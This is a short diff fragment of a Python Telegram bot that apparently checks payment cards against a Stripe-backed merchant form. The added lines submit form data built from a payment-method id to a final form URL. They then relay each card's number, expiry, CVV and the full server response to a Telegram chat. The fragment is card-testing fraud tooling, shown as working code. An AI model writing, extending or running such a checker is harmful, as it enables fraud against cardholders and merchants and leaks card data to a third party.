             continue
 
-        result = confirm_stripe(seti_id, cc, mm, yy, cvv)
-        bot.send_message(message.chat.id, result)
+        form_data = build_final_form_data(pm_id)
+        try:
+            resp = requests.post(FINAL_FORM_URL, headers=HEADERS_FINAL, data=form_data.encode(), timeout=30)
+            bot.send_message(message.chat.id, f"Card: {cc}|{mm}|{yy}|{cvv}\n\nFull Response:\n{resp.text}")
+        except Exception as e:
+            bot.send_message(message.chat.id, f"❌ Error submitting final form: {str(e)}")
+
         time.sleep(10)
 
 bot.infinity_polling()
